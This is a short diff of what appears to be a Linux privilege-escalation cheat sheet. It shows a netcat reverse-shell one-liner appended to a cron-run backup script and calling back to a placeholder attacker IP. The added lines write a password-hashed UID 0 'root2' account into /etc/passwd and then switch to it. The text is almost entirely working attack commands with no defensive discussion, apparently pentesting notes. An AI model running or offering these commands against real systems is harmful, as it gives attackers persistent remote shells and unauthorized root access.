@@ -59,6 +59,23 @@ Use this script to overwrite cronjob.
 
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <myip> <my port) >/tmp/f" >> user_backups.sh
 
+If you have write access to /etc/passwd/ you can write a password hash into the file and it will take precedence over the /etc/shadows file.
+
+1. openssl passwd w00t
+
+2. echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+3. su root2
+
+
+
+INSECURE SYSTEM COMPONENTS
+
+
+
+
+
+
 
 
 
